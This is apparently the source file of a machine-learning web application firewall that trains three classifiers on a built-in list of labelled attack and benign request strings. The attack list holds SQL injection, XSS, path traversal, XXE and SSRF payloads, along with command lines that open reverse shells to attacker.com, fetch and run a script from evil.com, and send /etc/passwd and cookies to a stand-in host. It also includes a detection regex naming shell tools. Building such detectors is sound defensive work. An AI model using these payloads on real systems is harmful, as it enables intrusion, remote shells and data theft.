"""
ml_engine.py
Multi-model Machine Learning WAF engine.

Trains and compares three classifiers:
  - Logistic Regression  (fast baseline)
  - Random Forest        (ensemble, handles non-linear boundaries)
  - XGBoost              (gradient boosting, typically best performer)

Uses a hybrid feature space:
  - TF-IDF character n-grams (captures attack signatures)
  - Hand-crafted statistical features (payload structure signals)

Dataset: Large synthetic corpus modelled on CSIC 2010 HTTP Dataset patterns.
To use real CSIC 2010 / UNSW-NB15 data, call load_external_dataset() from
dataset_utils.py and pass the result to retrain().
"""

import logging
import re
import time
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple

import numpy as np

logger = logging.getLogger("encoder.ml_engine")


# ── Training Dataset ─────────────────────────────────────────────────────────
# Synthetic corpus modelled after CSIC 2010 HTTP Dataset.
# Label: 1 = ATTACK, 0 = CLEAN (normal/benign)

_ATTACK_SAMPLES: List[str] = [
    # SQL Injection — Classic
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin'--",
    "1; DROP TABLE users--",
    "UNION SELECT null,null,null--",
    "' UNION SELECT username,password FROM users--",
    "1' AND SLEEP(5)--",
    "'; INSERT INTO users VALUES('hack','hack')--",
    "' OR 1=1#",
    "1 OR 1=1",
    "' OR 'x'='x",
    "1; SELECT * FROM information_schema.tables--",
    "'; EXEC xp_cmdshell('dir')--",
    "1' WAITFOR DELAY '0:0:5'--",
    "0x31 OR 0x31=0x31",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
    "1 UNION ALL SELECT 1,group_concat(table_name) FROM information_schema.tables--",
    "' OR CHAR(49)=CHAR(49)--",
    "/* comment */ OR 1=1",
    "admin' OR '1'='1'/*",
    "'; SHUTDOWN--",
    "1 OR '1'='1",
    "SELECT * FROM users WHERE id=1 OR 1=1",
    "1; EXEC sp_makewebtask 'c:\\inetpub\\wwwroot\\cmd.asp','SELECT''<%%execute(request(\"cmd\"))%%>'''--",
    "' HAVING 1=1--",
    "'; DECLARE @v NVARCHAR(4000);SET @v=...--",
    "id=1 AND 1=2 UNION SELECT 1,2,3--",
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
    "' GROUP BY columnnames having 1=1--",
    "1' AND BINARY_CHECKSUM(1)=BINARY_CHECKSUM(1)--",
    # SQL Injection — Evasion variants
    "SeLeCt * FrOm users",
    "UNION/**/SELECT/**/1,2,3",
    "un/**/ion sel/**/ect 1,2",
    "' or 0x3d3d --",
    "' /*!50000or*/ 1=1--",
    "'%20or%201%3d1--",
    "1+or+1%3d1--",
    "' or 'unusual'='unusual",
    "' or 2>1--",
    "OR 1=1",
    # XSS — Classic
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(document.cookie)",
    "<svg onload=alert(1)>",
    "<body onload=alert('XSS')>",
    "'><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "eval(String.fromCharCode(97,108,101,114,116,40,49,41))",
    "<input autofocus onfocus=alert(1)>",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<div style='background:url(javascript:alert(1))'>",
    "'><img src='x' onerror='alert(1)'>",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<isindex type=image src=1 onerror=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    "<link rel=import href=data:text/html,<script>alert(1)</script>>",
    # XSS — Evasion variants
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script >alert(1)</script >",
    "<script/src=data:,alert(1)>",
    "<%2fscript><%2fscript>",
    "<img src=`javascript:alert(1)`>",
    "<a href='javascript:alert(1)'>click</a>",
    "';alert(1)//",
    "\" onmouseover=\"alert(1)\"",
    # Command Injection
    "; cat /etc/passwd",
    "| whoami",
    "; ls -la",
    "&& cat /etc/shadow",
    "`id`",
    "$(whoami)",
    "; ping -c 1 attacker.com",
    "| nc -e /bin/sh attacker.com 4444",
    "; wget http://evil.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh",
    "' ; uname -a #",
    "; curl http://evil.com/$(id)",
    "| python3 -c 'import os;os.system(\"id\")'",
    "&& dir",
    "; echo 'pwned' > /tmp/test",
    "$(curl http://evil.com/?data=$(cat /etc/passwd|base64))",
    "`nslookup attacker.com`",
    "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "| awk '{print}' /etc/passwd",
    # Path Traversal
    "../../etc/passwd",
    "../../../etc/shadow",
    "%2e%2e%2fetc%2fpasswd",
    "..\\..\\windows\\system32\\cmd.exe",
    "/etc/passwd%00",
    "%c0%ae%c0%ae/etc/passwd",
    "....//....//etc/passwd",
    "..%252f..%252fetc%252fpasswd",
    "/proc/self/environ",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "....\\....\\boot.ini",
    "%252e%252e%252fetc%252fpasswd",
    "..././..././etc/passwd",
    # Header / CRLF Injection
    "foo%0d%0aSet-Cookie: admin=true",
    "value\r\nSet-Cookie: session=hijacked",
    "%0aSet-Cookie:%20admin=1",
    "%0d%0aLocation: http://evil.com",
    "%0d%0aContent-Length: 0",
    "x%0d%0aHTTP/1.1 200 OK",
    "%0aX-Forwarded-For: 127.0.0.1",
    "value%0d%0aSet-Cookie: session=hijacked; HttpOnly",
    # SSRF
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:8080/admin",
    "http://127.0.0.1:22",
    "file:///etc/passwd",
    "http://[::1]/admin",
    "http://0x7f000001/",
    "dict://localhost:11211/stat",
    "gopher://localhost:25/_MAIL FROM:attacker@evil.com",
    # XXE
    "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
    "<!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://evil.com/evil.dtd'>%xxe;]>",
    "<!ENTITY xxe SYSTEM 'file:///proc/self/environ'>",
    # Template Injection
    "{{7*7}}",
    "${7*7}",
    "#{7*7}",
    "<%= 7*7 %>",
    "{{config.items()}}",
    "${T(java.lang.Runtime).getRuntime().exec('id')}",
    "{{''.__class__.__mro__[2].__subclasses__()}}",
    # Encoded/Obfuscated attacks
    "%27%20OR%20%271%27%3D%271",
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "JTI3IE9SIDEnPScx",
    "%2527%2520OR%25201%253D1",
    "&#x27;&#x20;OR&#x20;&#x31;&#x3D;&#x31;",
    # NoSQL Injection
    "{'$gt': ''}",
    "{\"$where\": \"this.password == this.passwordConfirm\"}",
    "'; return true; var x='",
    "$where: '1==1'",
    "[$ne]=1",
    # LDAP Injection
    "*)(uid=*))(|(uid=*",
    "admin)(&(password=*))",
    "*()|&'",
    # Open Redirect
    "//evil.com",
    "/\\evil.com",
    "https://legit.com@evil.com",
    "javascript:window.location='http://evil.com'",
]

_CLEAN_SAMPLES: List[str] = [
    # Normal web requests
    "hello world",
    "search for cats and dogs",
    "my email is test@example.com",
    "product id 12345",
    "what is the weather today?",
    "username: john_doe",
    "my password is strong",
    "order by price descending",
    "drop shipment tracking number 4521",
    "insert a comment here",
    "null value in the form",
    "http://example.com/page",
    "user@domain.com",
    "query=python tutorial",
    "first name: Alice last name: Smith",
    "age 25 height 180cm",
    "1 + 1 = 2",
    "page 1 of 10",
    "sort by date asc",
    "category electronics",
    "price range 100 to 500",
    "city: New York, state: NY",
    "The script ran successfully",
    "alert the team about the meeting",
    "exec summary for Q3",
    "cat food for my pet",
    "ping me when you're free",
    "union of states in the country",
    "drop the topic if you want",
    "my location is 127.0.0.1 in the lab",
    "SELECT is a word I use in sentences",
    "I like OR dislike things",
    # E-commerce / typical web app traffic
    "GET /products?category=shoes&size=10&color=blue",
    "POST /checkout with items: [1,2,3]",
    "search term: running shoes under $100",
    "filter by brand=Nike&color=black",
    "user_id=12345&session_id=abc123def456",
    "page=2&per_page=20&sort=price_asc",
    "quantity=2&product_id=99887",
    "zip_code=10001&country=US",
    "date_from=2024-01-01&date_to=2024-12-31",
    "discount_code=SAVE10",
    "rating=5&review=Great product!",
    "name=John Smith&phone=555-1234",
    "address=123 Main St, Springfield",
    "coupon=SUMMER2024",
    "wishlist_id=789&add_item=true",
    # Form field values
    "First name: Robert",
    "Last name: Johnson",
    "Email: rjohnson@company.com",
    "Phone: +1-800-555-0100",
    "Message: I would like to know more about your services",
    "Subject: Product inquiry",
    "Order number: ORD-20240315-001",
    "Account balance: $1,234.56",
    "Transaction ID: TXN-abc123",
    "Shipping address: 456 Oak Ave, Portland OR 97201",
    "Comments: Please leave package at door",
    "Feedback: The website is easy to use",
    "Search: best Python books for beginners",
    "Query: how to reset my password",
    "Input: my username is alice123",
    # Technical but benign
    "GET /api/users/123/profile HTTP/1.1",
    "Content-Type: application/json",
    "Authorization: Bearer eyJhbGci...",
    "Accept: text/html,application/json",
    "Cache-Control: no-cache",
    "If-Modified-Since: Wed, 15 Mar 2024 00:00:00 GMT",
    "version=1.0&format=json&lang=en",
    "callback=handleResponse&timeout=30",
    "fields=name,email,phone&limit=100",
    "include=metadata&expand=details",
    # Numbers and IDs
    "id=42",
    "count=100&offset=0",
    "timestamp=1710000000",
    "hash=sha256abc123",
    "token=randomstring456",
    "ref=abc-def-123",
    "code=200",
    "status=active",
    "type=premium&tier=gold",
    "region=us-east-1",
]

# Build combined labelled dataset
_TRAINING_DATA: List[Tuple[str, int]] = (
    [(s, 1) for s in _ATTACK_SAMPLES] +
    [(s, 0) for s in _CLEAN_SAMPLES]
)


# ── Feature Engineering ──────────────────────────────────────────────────────

def _handcrafted_features(payload: str) -> np.ndarray:
    """
    Extract 20 statistical/structural features from a payload string.
    These complement TF-IDF by capturing things n-grams miss
    (e.g., entropy, special char ratios, keyword presence).
    """
    p = payload
    n = max(len(p), 1)

    # Character class ratios
    special_chars = sum(1 for c in p if not c.isalnum() and c != ' ')
    digits = sum(1 for c in p if c.isdigit())
    upper = sum(1 for c in p if c.isupper())
    lower = sum(1 for c in p if c.islower())

    # Shannon entropy
    from collections import Counter
    freq = Counter(p)
    entropy = -sum((cnt / n) * np.log2(cnt / n) for cnt in freq.values())

    # Structural signals
    has_comment = 1 if re.search(r'(/\*|--|\#)', p) else 0
    has_quote = 1 if ("'" in p or '"' in p) else 0
    has_semicolon = 1 if ';' in p else 0
    has_pipe = 1 if ('|' in p or '`' in p) else 0
    has_angle = 1 if ('<' in p or '>' in p) else 0
    has_pct_enc = 1 if re.search(r'%[0-9a-fA-F]{2}', p) else 0
    has_hex = 1 if re.search(r'0x[0-9a-fA-F]+', p) else 0
    has_crlf = 1 if re.search(r'(%0d|%0a|\r|\n)', p, re.I) else 0

    # SQL keyword count
    sql_kws = ['select', 'union', 'insert', 'delete', 'drop', 'update',
               'from', 'where', 'having', 'sleep', 'exec', 'declare']
    sql_count = sum(1 for kw in sql_kws if kw in p.lower())

    # XSS keyword count
    xss_kws = ['script', 'javascript', 'onerror', 'onload', 'eval', 'alert', 'iframe']
    xss_count = sum(1 for kw in xss_kws if kw in p.lower())

    # Path traversal signals
    traversal = 1 if re.search(r'(\.\.[\\/]|%2e%2e)', p, re.I) else 0

    # Repeated char ratio (obfuscation indicator)
    repeated = max(freq.values()) / n if freq else 0

    return np.array([
        special_chars / n,   # special char density
        digits / n,           # digit ratio
        upper / n,            # uppercase ratio
        lower / n,            # lowercase ratio
        entropy,              # character entropy
        len(p) / 200,         # normalised payload length
        has_comment,          # SQL comment present
        has_quote,            # quote present
        has_semicolon,        # semicolon present
        has_pipe,             # pipe/backtick present
        has_angle,            # angle bracket present
        has_pct_enc,          # percent-encoded chars
        has_hex,              # hex literals
        has_crlf,             # CRLF / newline injection
        sql_count / 12,       # SQL keyword density
        xss_count / 7,        # XSS keyword density
        traversal,            # path traversal
        repeated,             # max char repetition ratio
        p.count('=') / n,     # equals sign density (SQL logic)
        p.count('/') / n,     # slash density (path traversal / XSS)
    ], dtype=np.float32)


class _HandcraftedTransformer:
    """Sklearn-compatible transformer wrapping _handcrafted_features."""

    def fit(self, X, y=None):
        return self

    def transform(self, X):
        return np.vstack([_handcrafted_features(x) for x in X])

    def fit_transform(self, X, y=None):
        return self.transform(X)


# ── Model Result Dataclasses ─────────────────────────────────────────────────

@dataclass
class ModelMetrics:
    """Performance metrics for a single trained model."""
    model_name: str
    accuracy: float
    precision: float
    recall: float
    f1_score: float
    auc_roc: float
    cv_mean: float
    cv_std: float
    train_time_sec: float

    def to_dict(self) -> dict:
        return {
            "model_name": self.model_name,
            "accuracy": round(self.accuracy * 100, 2),
            "precision": round(self.precision * 100, 2),
            "recall": round(self.recall * 100, 2),
            "f1_score": round(self.f1_score * 100, 2),
            "auc_roc": round(self.auc_roc * 100, 2),
            "cv_mean": round(self.cv_mean * 100, 2),
            "cv_std": round(self.cv_std * 100, 2),
            "train_time_sec": round(self.train_time_sec, 3),
        }


@dataclass
class MLWAFResult:
    """Classification result from the ML WAF ensemble."""
    payload: str
    label: str                   # "ATTACK" or "CLEAN"
    confidence: float            # probability of the predicted class
    attack_probability: float
    clean_probability: float
    model_votes: Dict[str, str]  # per-model predictions
    features_matched: List[str]

    def to_dict(self) -> dict:
        return {
            "payload": self.payload,
            "label": self.label,
            "confidence": round(self.confidence * 100, 1),
            "attack_probability": round(self.attack_probability * 100, 1),
            "clean_probability": round(self.clean_probability * 100, 1),
            "model_votes": self.model_votes,
            "features_matched": self.features_matched,
        }


# ── Multi-Model ML Engine ────────────────────────────────────────────────────

class MLEngine:
    """
    Multi-model WAF classifier.

    Trains Logistic Regression, Random Forest, and XGBoost in parallel
    using a hybrid feature space (TF-IDF char n-grams + hand-crafted features).
    Exposes per-model metrics and an ensemble prediction.
    """

    def __init__(self):
        self._models: Dict[str, object] = {}
        self._metrics: Dict[str, ModelMetrics] = {}
        self._trained = False
        self._dataset_info: dict = {}
        self._train()

    # ── Training ──────────────────────────────────────────────────────────────

    def _build_feature_pipeline(self, clf):
        """Build a Pipeline with hybrid TF-IDF + handcrafted features."""
        from sklearn.pipeline import Pipeline, FeatureUnion
        from sklearn.feature_extraction.text import TfidfVectorizer

        features = FeatureUnion([
            ("tfidf", TfidfVectorizer(
                analyzer="char_wb",
                ngram_range=(2, 5),
                min_df=1,
                max_features=5000,
                sublinear_tf=True,
            )),
            ("handcrafted", _HandcraftedTransformer()),
        ])

        return Pipeline([("features", features), ("clf", clf)])

    def _train(self) -> None:
        """Train all models on the built-in dataset.

        XGBoost is optional — if not installed (e.g. on Vercel / lightweight
        environments) the engine falls back to Logistic Regression + Random
        Forest, which are both scikit-learn and always available.
        """
        try:
            from sklearn.linear_model import LogisticRegression
            from sklearn.ensemble import RandomForestClassifier
            from sklearn.model_selection import cross_val_score, train_test_split
            from sklearn.metrics import (accuracy_score, precision_score,
                                         recall_score, f1_score, roc_auc_score)

            # XGBoost is optional — skip gracefully if not installed
            try:
                from xgboost import XGBClassifier
                _xgb_available = True
            except ImportError:
                _xgb_available = False
                logger.warning("XGBoost not installed — skipping XGBoost model.")

            texts = [d[0] for d in _TRAINING_DATA]
            labels = [d[1] for d in _TRAINING_DATA]

            X_train, X_test, y_train, y_test = train_test_split(
                texts, labels, test_size=0.25, random_state=42, stratify=labels
            )

            self._dataset_info = {
                "total_samples": len(texts),
                "attack_samples": sum(labels),
                "clean_samples": len(labels) - sum(labels),
                "train_size": len(X_train),
                "test_size": len(X_test),
            }

            model_specs = {
                "Logistic Regression": LogisticRegression(
                    C=5.0, max_iter=2000, random_state=42, solver="lbfgs"
                ),
                "Random Forest": RandomForestClassifier(
                    n_estimators=200, max_depth=20, min_samples_split=2,
                    random_state=42, n_jobs=-1
                ),
            }
            if _xgb_available:
                model_specs["XGBoost"] = XGBClassifier(
                    n_estimators=200, max_depth=6, learning_rate=0.1,
                    use_label_encoder=False, eval_metric="logloss",
                    random_state=42, verbosity=0
                )

            for name, clf in model_specs.items():
                pipeline = self._build_feature_pipeline(clf)

                t0 = time.time()
                pipeline.fit(X_train, y_train)
                train_time = time.time() - t0

                y_pred = pipeline.predict(X_test)
                y_prob = pipeline.predict_proba(X_test)[:, 1]

                cv_scores = cross_val_score(pipeline, texts, labels, cv=5, scoring="f1")

                self._models[name] = pipeline
                self._metrics[name] = ModelMetrics(
                    model_name=name,
                    accuracy=accuracy_score(y_test, y_pred),
                    precision=precision_score(y_test, y_pred, zero_division=0),
                    recall=recall_score(y_test, y_pred, zero_division=0),
                    f1_score=f1_score(y_test, y_pred, zero_division=0),
                    auc_roc=roc_auc_score(y_test, y_prob),
                    cv_mean=float(np.mean(cv_scores)),
                    cv_std=float(np.std(cv_scores)),
                    train_time_sec=train_time,
                )
                logger.info("Trained %s — F1=%.3f AUC=%.3f",
                            name,
                            self._metrics[name].f1_score,
                            self._metrics[name].auc_roc)

            self._trained = True

        except Exception as exc:
            logger.error("MLEngine training failed: %s", exc, exc_info=True)
            self._trained = False

    def retrain(self, texts: List[str], labels: List[int]) -> bool:
        """
        Retrain all models on a new external dataset.
        Pass in lists of (payload_string, label) from dataset_utils.py.
        Returns True on success.
        """
        global _TRAINING_DATA
        _TRAINING_DATA = list(zip(texts, labels))
        try:
            self._train()
            return self._trained
        except Exception as exc:
            logger.error("Retrain failed: %s", exc)
            return False

    # ── Inference ─────────────────────────────────────────────────────────────

    def classify(self, payload: str) -> MLWAFResult:
        """Classify a payload with all models and return ensemble result."""
        if not self._trained:
            return MLWAFResult(
                payload=payload, label="UNKNOWN", confidence=0.0,
                attack_probability=0.0, clean_probability=0.0,
                model_votes={}, features_matched=["Models not trained"],
            )

        attack_probs = []
        votes = {}

        for name, pipeline in self._models.items():
            try:
                proba = pipeline.predict_proba([payload])[0]
                attack_prob = float(proba[1])
                attack_probs.append(attack_prob)
                votes[name] = "ATTACK" if attack_prob > 0.5 else "CLEAN"
            except Exception as exc:
                logger.warning("Model %s inference error: %s", name, exc)
                votes[name] = "ERROR"

        if not attack_probs:
            avg_attack = 0.0
        else:
            avg_attack = float(np.mean(attack_probs))

        is_attack = avg_attack > 0.5
        label = "ATTACK" if is_attack else "CLEAN"
        confidence = avg_attack if is_attack else (1.0 - avg_attack)

        return MLWAFResult(
            payload=payload,
            label=label,
            confidence=confidence,
            attack_probability=avg_attack,
            clean_probability=1.0 - avg_attack,
            model_votes=votes,
            features_matched=_extract_suspicious_features(payload),
        )

    def classify_with_model(self, payload: str, model_name: str) -> dict:
        """Classify using a specific model only."""
        if model_name not in self._models:
            return {"error": f"Unknown model: {model_name}"}

        pipeline = self._models[model_name]
        proba = pipeline.predict_proba([payload])[0]
        attack_prob = float(proba[1])
        is_attack = attack_prob > 0.5

        return {
            "payload": payload,
            "model": model_name,
            "label": "ATTACK" if is_attack else "CLEAN",
            "attack_probability": round(attack_prob * 100, 1),
            "clean_probability": round((1 - attack_prob) * 100, 1),
        }

    # ── Reporting ─────────────────────────────────────────────────────────────

    def get_metrics(self) -> dict:
        """Return per-model training/evaluation metrics."""
        return {
            "trained": self._trained,
            "dataset": self._dataset_info,
            "models": {
                name: m.to_dict()
                for name, m in self._metrics.items()
            },
        }

    def get_available_models(self) -> List[str]:
        return list(self._models.keys())

    def get_best_model(self) -> Optional[str]:
        """Return name of the model with highest F1 score."""
        if not self._metrics:
            return None
        return max(self._metrics.items(), key=lambda x: x[1].f1_score)[0]

    def get_comparison_table(self) -> List[dict]:
        """Return metrics as a list of dicts for table display."""
        return [m.to_dict() for m in self._metrics.values()]

    def batch_classify(self, payloads: List[str]) -> List[dict]:
        """Classify a list of payloads and return results."""
        return [self.classify(p).to_dict() for p in payloads]


# ── Shared helper ────────────────────────────────────────────────────────────

def _extract_suspicious_features(payload: str) -> List[str]:
    """Identify which attack categories the payload resembles."""
    features = []
    checks = [
        (r"(?i)(union.*select|select.*from|drop\s+table|insert\s+into|delete\s+from)", "SQL Keywords"),
        (r"(?i)(or\s+1\s*=\s*1|and\s+1\s*=\s*1|or\s+'[^']*'\s*=\s*'[^']*')", "SQL Logic Bypass"),
        (r"(?i)(sleep\s*\(|waitfor\s+delay|benchmark\s*\(|pg_sleep)", "Blind SQLi / Time-Based"),
        (r"(?i)(<script|javascript:|onerror=|onload=|eval\(|alert\()", "XSS Patterns"),
        (r"(?i)(document\.cookie|document\.location|String\.fromCharCode)", "JS Data Theft"),
        (r"(;|\||\`|\$\()\s*(cat|ls|whoami|id|wget|curl|nc|bash|sh)\b", "Command Injection"),
        (r"(\.\./|\.\.\\|%2e%2e)", "Path Traversal"),
        (r"(%0d%0a|\r\n|%0a%0d|set-cookie\s*:)", "Header / CRLF Injection"),
        (r"(?i)(<!DOCTYPE|<!ENTITY|SYSTEM\s+['\"]file)", "XXE Injection"),
        (r"(\{\{|\$\{|#\{|<%=)", "Template Injection"),
        (r"(?i)(http://169\.254|file:///|gopher://|dict://)", "SSRF"),
        (r"(?i)(\[\$ne\]|\[\$gt\]|\$where|\$regex)", "NoSQL Injection"),
        (r"(%[0-9a-fA-F]{2}){3,}", "Heavy URL Encoding (Evasion)"),
        (r"(%00|\\x00|\\u0000)", "Null Byte Injection"),
    ]
    for pattern, name in checks:
        if re.search(pattern, payload):
            features.append(name)
    return features if features else ["No known patterns detected"]
